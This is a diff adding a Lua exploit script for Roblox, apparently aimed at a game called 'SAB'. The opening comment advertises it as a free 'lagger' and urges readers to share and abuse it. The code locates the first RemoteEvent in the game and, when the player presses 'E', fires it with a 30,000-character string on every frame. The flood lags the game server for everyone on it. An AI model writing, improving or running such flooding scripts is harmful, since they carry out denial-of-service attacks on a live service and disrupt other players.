@@ -1,0 +1,37 @@
+-- free lagger ( theres no anti lagger so u will lag aswell, click keybind "e" to toggle on then just wait. w deathz LOL dont buy useless shit bro) ask ai to make u a toggle button for mobile btw. if u make anti lagger just share it so everyone abuses it and doesnt pay hubs for useless shit W DEATHZ W DEATHZ W DEATHZ W DEATHZ W DEATHZ W DEATHZ W DEATHZ W DEATHZ NO NEED TO THANK ME SAB DEVS patch this lol not letting zzz make money when he sell useless shit
+ 
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+ 
+local isLagging = false
+local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28" 
+ 
+ 
+local num = string.rep("z", 30000) 
+ 
+ 
+local target = nil
+for _, v in pairs(game:GetDescendants()) do
+ 
+    if v:IsA("RemoteEvent") and v.Name ~= "friendmain" and v.Name ~= "ping" then
+        target = v
+        break
+    end
+end
+ 
+ 
+UserInputService.InputBegan:Connect(function(input, proc)
+    if not proc and input.KeyCode == Enum.KeyCode.E then
+        isLagging = not isLagging
+print("test")
+    end
+end)
+ 
+ 
+RunService.Heartbeat:Connect(function()
+    if isLagging and target then
+         for i = 1, 1 do
+            target:FireServer(uuid, num)
+        end
+    end
+end)
